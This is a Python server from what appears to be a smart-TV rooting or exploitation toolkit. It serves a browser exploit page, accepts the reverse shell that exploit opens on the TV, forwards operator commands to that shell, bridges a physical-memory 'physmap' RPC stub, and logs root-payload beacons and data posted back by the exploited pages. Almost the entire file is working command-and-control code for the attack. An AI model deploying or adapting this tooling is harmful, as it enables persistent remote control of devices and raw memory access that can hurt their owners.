"""Port-80 server + interactive TV shell + physmap-RPC gateway.

* port 80        : HTTP (serves the exploit page), the reverse-shell callback,
                   and the physmap RPC stub (identified by the "PGDB" hello).
* 127.0.0.1:9999 : local control channel; anything typed here is forwarded to
                   the TV shell, and everything the TV prints comes back + goes to
                   shell.log
* 127.0.0.1:9998 : RPC gateway.  A local client connects here and is bridged
                   byte-for-byte to a TV connection that sent "PGDB".

The TV shell (from the browser exploit) runs as uid=5001(owner) and persists as
long as this server keeps the socket open.
"""
import os
import queue
import socket
import threading
import time
import traceback
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parent
# All runtime output lives under logs/ so the toolkit directory stays readable:
#   logs/server.out, logs/server.err   launcher redirects (root.ps1)
#   logs/shell.log[.1]                 rolling shell/TV console capture
#   logs/beacons.log                   one timestamped line per DSHROOT beacon
#   logs/tv/                           pages POST /save dumps (pruned)
LOGS = ROOT / "logs"
LOGS_TV = LOGS / "tv"
LOGS.mkdir(exist_ok=True)
LOGS_TV.mkdir(exist_ok=True)
LOG = LOGS / "shell.log"
BEACON_LOG = LOGS / "beacons.log"
TV_KEEP = int(os.environ.get("TV_OUTPUT_KEEP", "100"))
CTRL_PORT = 9999
RPC_PORT = 9998
HTTP_PORT = int(os.environ.get("HTTP_PORT", "80"))
HTTP_BIND = os.environ.get("HTTP_BIND", "0.0.0.0")

TYPES = {".html": "text/html", ".js": "application/javascript",
         ".json": "application/json", ".bin": "application/octet-stream"}

# Never serve the server's own source or its logs on the LAN.
DENY_SUFFIX = {".py", ".log", ".out", ".err", ".db", ".pem", ".key", ".journal"}
DENY_NAMES = {"shell.log", "server.out", "server.err"}
LOG_MAX = 8 * 1024 * 1024

state_lock = threading.Lock()
tv_sock = None
output = bytearray()          # everything the TV printed (rolling)
rpc_queue = queue.Queue()     # TV connections that announced "PGDB"
rpc_lock = threading.Lock()
rpc_tv = None                 # live TV physmap-RPC socket
rpc_client = None             # local client currently attached
rpc_hello = b""               # 12-byte hello captured when the stub connected


def _drop_tv_socket():
    """Close and forget the current TV stub AND any stale local client.

    Caller must hold rpc_lock.  Clearing rpc_client matters as much as the TV
    socket: a killed client leaves its thread holding the slot, and every later
    client then gets "BUSY" - the same class of stall as a wedged stub.
    """
    global rpc_tv, rpc_hello, rpc_client
    conn, rpc_tv, rpc_hello = rpc_tv, None, b""
    if conn is None:
        # Nothing paired, so any rpc_client is a client still *waiting* for a stub.
        # Evicting it here would drop the stub it is about to receive - that race
        # is what killed a freshly-connected page during testing.  Leave it alone.
        print("[rpc] RSET: nothing paired, keeping the waiting client", flush=True)
        return
    client, rpc_client = rpc_client, None
    try:
        conn.close()
    except OSError:
        pass
    print("[rpc] dropped the current TV stub (RSET)", flush=True)
    if client is not None:
        try:
            client.close()
        except OSError:
            pass
        print("[rpc] dropped the paired client (RSET)", flush=True)


def log(text: str):
    try:
        if LOG.exists() and LOG.stat().st_size > LOG_MAX:
            bak = LOG.with_name("shell.log.1")
            try:
                bak.unlink()
            except FileNotFoundError:
                pass
            LOG.rename(bak)
    except OSError:
        pass
    with LOG.open("a", encoding="utf-8", errors="replace") as fh:
        fh.write(text)


def _prune_tv_outputs():
    """Keep only the newest TV_KEEP /save dumps - the page can POST frequently."""
    if TV_KEEP <= 0:
        return
    try:
        files = sorted(LOGS_TV.glob("tv_output_*.txt"), key=lambda p: p.stat().st_mtime)
        for old in files[:-TV_KEEP]:
            old.unlink()
    except OSError:
        pass


def _is_textish(chunk: bytes) -> bool:
    """True for shell/console output; False for 4 KB binary physmap pages."""
    if not chunk:
        return False
    sample = chunk[:4096]
    printable = sum(1 for b in sample if 32 <= b < 127 or b in (9, 10, 13))
    return printable * 10 >= len(sample) * 9


def _read_full_request(conn, first):
    """Read headers, then the body per Content-Length (needed for POST /save)."""
    data = first
    while b"\r\n\r\n" not in data:
        try:
            chunk = conn.recv(65536)
        except OSError:
            break
        if not chunk:
            break
        data += chunk
        if len(data) > 1_000_000:
            break
    head, _, body = data.partition(b"\r\n\r\n")
    clen = 0
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            try:
                clen = int(line.split(b":", 1)[1].strip())
            except ValueError:
                clen = 0
    while len(body) < clen:
        try:
            chunk = conn.recv(min(65536, clen - len(body)))
        except OSError:
            break
        if not chunk:
            break
        body += chunk
    return head, body


def serve_http(conn, req):
    try:
        head, body = _read_full_request(conn, req)
        line = head.split(b"\r\n", 1)[0].decode("latin-1")
        parts = line.split()
        method = parts[0] if parts else "GET"
        path = (parts[1] if len(parts) > 1 else "/").split("?")[0]

        # --- log sink: pages POST their textarea here ---
        if method == "POST" and path == "/save":
            from datetime import datetime
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            out = LOGS_TV / f"tv_output_{stamp}.txt"
            out.write_bytes(body)
            _prune_tv_outputs()
            hdr = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok"
            conn.sendall(hdr)
            print(f"[save] {out.name} {len(body)}B", flush=True)
            return

        if path == "/":
            path = "/index.html"
        target = (ROOT / path.lstrip("/")).resolve()
        try:
            rel = target.relative_to(ROOT)    # reject ../ escapes, not a prefix test
        except ValueError:
            conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
            return
        if "logs" in rel.parts:               # never serve our own logs
            conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
            return
        if target.suffix.lower() in DENY_SUFFIX or target.name in DENY_NAMES:
            conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
            return
        if not target.is_file():
            conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
            return
        data = target.read_bytes()
        ctype = TYPES.get(target.suffix, "application/octet-stream")
        hdr = (f"HTTP/1.1 200 OK\r\nContent-Type: {ctype}\r\n"
               f"Content-Length: {len(data)}\r\nCache-Control: no-store\r\n"
               f"Connection: close\r\n\r\n").encode()
        conn.sendall(hdr + data)
        print(f"[http] {path} {len(data)}B", flush=True)
    except Exception as exc:
        print(f"[http] {exc}", flush=True)


def tv_reader(conn):
    global output
    while True:
        try:
            chunk = conn.recv(65536)
        except OSError:
            break
        if not chunk:
            break
        if len(chunk) <= 512 and _is_textish(chunk):
            with state_lock:
                output.extend(chunk)
            log(chunk.decode("latin-1", "replace"))
        print(f"[tv] {chunk[:200]!r}", flush=True)
    print("[tv] shell closed", flush=True)


def handle_shell(conn):
    global tv_sock
    with state_lock:
        tv_sock = conn
        output.clear()
    print("[shell] reverse shell connected", flush=True)
    log(f"\n===== {datetime.now().isoformat(timespec='seconds')} shell open =====\n")
    threading.Thread(target=tv_reader, args=(conn,), daemon=True).start()


def _recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def rpc_tv_reader(conn):
    """Persistent reader for a TV RPC socket, forwards to the current client."""
    global rpc_tv, rpc_client
    while True:
        try:
            chunk = conn.recv(65536)
        except OSError:
            break
        if not chunk:
            break
        with rpc_lock:
            c = rpc_client
        if c is not None:
            try:
                c.sendall(chunk)
            except OSError:
                with rpc_lock:
                    if rpc_client is c:
                        rpc_client = None
        if _is_textish(chunk):
            with state_lock:
                output.extend(chunk)
            log(chunk.decode("latin-1", "replace"))
    with rpc_lock:
        if rpc_tv is conn:
            rpc_tv = None
    print("[rpc] TV RPC socket closed", flush=True)


def rpc_gateway_client(client):
    """Attach a local client to the live TV RPC stub (re-pairing supported)."""
    global rpc_tv, rpc_client, rpc_hello, tv_sock
    with rpc_lock:
        if rpc_client is not None:
            try:
                client.sendall(b"BUSY")
            except OSError:
                pass
            client.close()
            return
        conn = rpc_tv
        first = conn is None
        if first:
            print("[rpc] local client connected, waiting for TV", flush=True)
            try:
                conn = rpc_queue.get(timeout=1800)
            except queue.Empty:
                print("[rpc] no TV connection, closing client", flush=True)
                client.close()
                return
            rpc_tv = conn
            print("[rpc] paired with TV physmap stub", flush=True)
        else:
            # A page reload leaves a newer stub in the queue.  Always prefer it
            # over the current one: an op-7 shell shares the stub socket and can
            # leave the stub deaf, and without this a single wedged stub blocks
            # every later attempt until the server is restarted (this is what
            # stalled the previous session).
            try:
                fresh = rpc_queue.get_nowait()
            except queue.Empty:
                fresh = None
            if fresh is not None:
                try:
                    conn.close()
                except OSError:
                    pass
                conn = fresh
                rpc_tv = fresh
                first = True
                print("[rpc] fresh TV stub replaced the wedged one", flush=True)
            else:
                print("[rpc] client re-attached to live TV stub", flush=True)
        rpc_client = client

    if first:
        hello = _recv_exact(conn, 12)
        if hello is None:
            print("[rpc] TV closed before hello", flush=True)
            with rpc_lock:
                rpc_tv = None
                rpc_client = None
            client.close()
            return
        rpc_hello = hello
        m, pr, op = hello[:4], int.from_bytes(hello[4:8], "little", signed=True), \
            int.from_bytes(hello[8:12], "little", signed=True)
        print(f"[rpc] hello {m!r} prctl_ret={pr} open_ret={op}", flush=True)
        with state_lock:
            tv_sock = conn
        threading.Thread(target=rpc_tv_reader, args=(conn,), daemon=True).start()
    else:
        hello = rpc_hello

    try:
        client.sendall(hello)
        while True:
            data = client.recv(65536)
            if not data:
                break
            conn.sendall(data)
    except OSError:
        pass
    with rpc_lock:
        if rpc_client is client:
            rpc_client = None
    print("[rpc] client detached (TV kept open for re-attach)", flush=True)

def control_client(client):
    def to_tv():
        while True:
            try:
                data = client.recv(4096)
            except OSError:
                break
            if not data:
                break
            with state_lock:
                s = tv_sock
            if s:
                try:
                    s.sendall(data)
                except OSError:
                    break

    def from_tv():
        pos = 0
        with state_lock:
            pos = len(output)
        while True:
            with state_lock:
                new = bytes(output[pos:])
                pos = len(output)
            if new:
                try:
                    client.sendall(new)
                except OSError:
                    break
            else:
                time.sleep(0.05)

    threading.Thread(target=to_tv, daemon=True).start()
    from_tv()


def safe_accept(srv, label):
    """accept() that survives transient errors instead of ending the thread.

    A bare `srv.accept()` in the main thread is fatal: any OSError there ends
    http_server(), which ends the process with no traceback in our logs (the
    console that would have shown it is not attached when run from Task
    Scheduler).  Retry with a small backoff and log the reason.
    """
    while True:
        try:
            return srv.accept()
        except Exception:
            print(f"[{label}] accept failed, retrying:", flush=True)
            traceback.print_exc()
            time.sleep(0.2)


def control_server():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", CTRL_PORT))
    srv.listen(8)
    print(f"[ctrl] listening on 127.0.0.1:{CTRL_PORT}", flush=True)
    while True:
        c, _ = safe_accept(srv, 'ctrl')
        threading.Thread(target=control_client, args=(c,), daemon=True).start()


def rpc_server():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", RPC_PORT))
    srv.listen(8)
    print(f"[rpc] gateway listening on 127.0.0.1:{RPC_PORT}", flush=True)
    while True:
        c, _ = safe_accept(srv, 'rpc')
        # A client may start with "RSET" to drop a wedged/stale TV pairing.
        # Without this the only cure was restarting the whole server, because a
        # stub that was consumed by op 5/op 7 (or half-dead after a power cycle)
        # stays as rpc_tv and answers every later client with a cached hello.
        try:
            c.settimeout(2.0)
            head = c.recv(4, socket.MSG_PEEK)
            c.settimeout(None)
        except OSError:
            head = b""
        if head == b"RSET":
            try:
                c.recv(4)
            except OSError:
                pass
            with rpc_lock:
                dropped = rpc_tv is not None
                _drop_tv_socket()
            try:
                c.sendall(b"OK\n" if dropped else b"IDLE\n")
            except OSError:
                pass
            c.close()
            continue
        threading.Thread(target=rpc_gateway_client, args=(c,), daemon=True).start()


def http_server():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HTTP_BIND, HTTP_PORT))
    srv.listen(32)
    print(f"[http] listening on {HTTP_BIND}:{HTTP_PORT}", flush=True)
    while True:
        conn, addr = safe_accept(srv, 'http')
        try:
            conn.settimeout(1.5)
            try:
                first = conn.recv(16, socket.MSG_PEEK)
            except socket.timeout:
                first = b""
            conn.settimeout(None)
            if first[:4] == b"PGDB":
                print("[rpc] TV physmap stub connected", flush=True)
                rpc_queue.put(conn)
                continue
            if first[:7] == b"DSHROOT":
                # app payload beacon: log it, but never let it take the shell slot
                try:
                    data = conn.recv(8192)
                    print(f"[beacon] {data[:300]!r}", flush=True)
                    with BEACON_LOG.open("a", encoding="utf-8", errors="replace") as fh:
                        fh.write(f"{datetime.now().isoformat(timespec='seconds')} "
                                 f"{data.decode('latin-1').strip()}\n")
                except OSError:
                    pass
                conn.close()
                continue
            if first[:4] in (b"GET ", b"POST", b"HEAD", b"OPTI"):
                req = b""
                try:
                    req = conn.recv(8192)
                except OSError:
                    pass
                conn.settimeout(10)          # never let one HTTP client hang the accept loop
                serve_http(conn, req)
                conn.close()
            else:
                handle_shell(conn)   # keep open
        except Exception as exc:
            print(f"[http] {exc}", flush=True)


if __name__ == "__main__":
    print(f"[init] logs -> {LOGS}", flush=True)
    threading.Thread(target=control_server, daemon=True).start()
    threading.Thread(target=rpc_server, daemon=True).start()
    http_server()
